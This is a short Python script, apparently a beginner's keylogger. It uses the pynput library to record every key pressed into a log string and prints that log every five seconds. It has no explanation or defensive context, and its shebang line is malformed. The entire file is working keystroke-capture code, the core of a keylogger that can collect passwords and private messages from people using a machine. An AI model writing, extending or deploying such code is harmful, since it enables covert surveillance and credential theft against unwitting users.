#!/usr/binenv python
import pynput
from threading import Timer
log = ""

def process_key_process(key):
    global log
    try:
        log = log + " " + str(key.char)
    except AttributeError:
        if key==key.space:
            log = log + " "
        else:
            log = log + " " + str(key)
    print(log)

def report():
    global log
    print(log)
    log = ""
    Timer_time_func = Timer(5, report)
    Timer_time_func.start()

with pynput.keyboard.Listener(on_press=process_key_process) as keyboard_listener:
    report()
    keyboard_listener.join()


